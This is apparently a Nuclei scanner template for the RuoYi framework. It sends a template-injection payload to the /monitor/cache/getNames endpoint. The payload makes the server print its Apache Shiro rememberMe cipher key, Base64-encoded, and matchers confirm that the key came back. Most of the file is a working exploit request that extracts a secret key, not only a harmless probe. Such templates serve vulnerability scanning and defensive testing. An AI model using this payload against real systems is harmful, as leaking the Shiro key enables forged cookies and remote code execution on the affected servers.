id: ruoyi-getNames-shirokey

info:
  name: ruoyi-getNames-shirokey
  author: ro1t
  severity: high
  metadata:
    fofa-qeury: app=""
  tags: ruoyi

http:
  - raw:
      - |
        GET /ruoyi/js/ry-ui.js?v=4.8.1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
        Content-Length: 2
      - |
        POST /monitor/cache/getNames HTTP/1.1
        Host: {{Hostname}}

        fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'status_code_2 == 200'
              - 'contains(header_2,"Content-Length: 24")'
        condition: and

